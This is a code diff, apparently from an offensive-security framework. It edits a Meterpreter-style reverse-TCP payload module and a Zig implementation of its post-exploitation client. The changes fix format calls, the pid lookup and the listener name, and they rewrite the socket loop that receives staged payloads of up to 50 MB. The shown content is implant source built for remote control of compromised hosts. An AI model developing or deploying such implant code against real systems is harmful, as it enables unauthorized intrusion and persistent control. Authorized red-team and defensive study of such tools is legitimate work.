@@ -29,7 +29,7 @@ class Module(Payload):
         'category': 'singles',
         'platform': Platform.UNIX,
         'arch': Arch.X64,
-        'listener': 'listeners/multi/meterpreter',
+        'listener': 'listeners/multi/meterpreter_reverse_tcp',
         'handler': Handler.REVERSE,
         'session_type': SessionType.METERPRETER,
         'references': [
@@ -399,7 +399,7 @@ const MeterpreterClient = struct {
         const pid: i32 = if (builtin.target.os.tag == .windows) 
             @intCast(os.windows.GetCurrentProcessId())
         else
-            @intCast(posix.getpid());
+            @intCast(os.linux.getpid());
         try appendFmt(self.allocator, &output, "Current pid: {d}\n", .{pid});
 
         return CommandResult{
@@ -811,7 +811,7 @@ const MeterpreterClient = struct {
         return CommandResult{
             .output = "",
             .status = 1,
-            .error_msg = try std.fmt.allocPrint(self.allocator, "Linux screenshot via framebuffer not fully implemented. X11 API required."),
+            .error_msg = try std.fmt.allocPrint(self.allocator, "Linux screenshot via framebuffer not fully implemented. X11 API required.", .{}),
         };
     }
 
@@ -821,7 +821,7 @@ const MeterpreterClient = struct {
         return CommandResult{
             .output = "",
             .status = 1,
-            .error_msg = try std.fmt.allocPrint(self.allocator, "macOS screenshot via CoreGraphics not yet implemented."),
+            .error_msg = try std.fmt.allocPrint(self.allocator, "macOS screenshot via CoreGraphics not yet implemented.", .{}),
         };
     }
 
@@ -830,7 +830,7 @@ const MeterpreterClient = struct {
             return CommandResult{
                 .output = "",
                 .status = 1,
-                .error_msg = try std.fmt.allocPrint(self.allocator, "getsystem is only supported on Windows"),
+                .error_msg = try std.fmt.allocPrint(self.allocator, "getsystem is only supported on Windows", .{}),
             };
         }
         
@@ -1056,19 +1056,14 @@ const MeterpreterClient = struct {
         } else {
             const fd = @as(posix.fd_t, @intCast(fd_val));
             
-            const flags = try posix.fcntl(fd, posix.F.GETFL, 0);
-            _ = try posix.fcntl(fd, posix.F.SETFL, flags | posix.O.NONBLOCK);
-            defer _ = posix.fcntl(fd, posix.F.SETFL, flags) catch {};
-            
             bytes_read = 0;
-            const n = posix.recv(fd, &length_bytes, 0) catch |err| {
-                if (err == error.WouldBlock) return;
-                return err;
-            };
-            if (n < 4) return;
+            while (bytes_read < 4) {
+                const n = try posix.recv(fd, length_bytes[bytes_read..], 0);
+                if (n == 0) return;
+                bytes_read += n;
+            }
             
             const stage_length = mem.readInt(u32, &length_bytes, .big);
-            _ = try posix.fcntl(fd, posix.F.SETFL, flags);
             
             if (stage_length > 0 and stage_length < 50 * 1024 * 1024) {
                 var stage_buf = try self.allocator.alloc(u8, stage_length);
@@ -1124,7 +1119,7 @@ const CommandParsed = struct {
     }
     
     pub fn value(self: *const CommandParsed) Command {
-        return self.parsed;
+        return self.parsed.value;
     }
 };
 
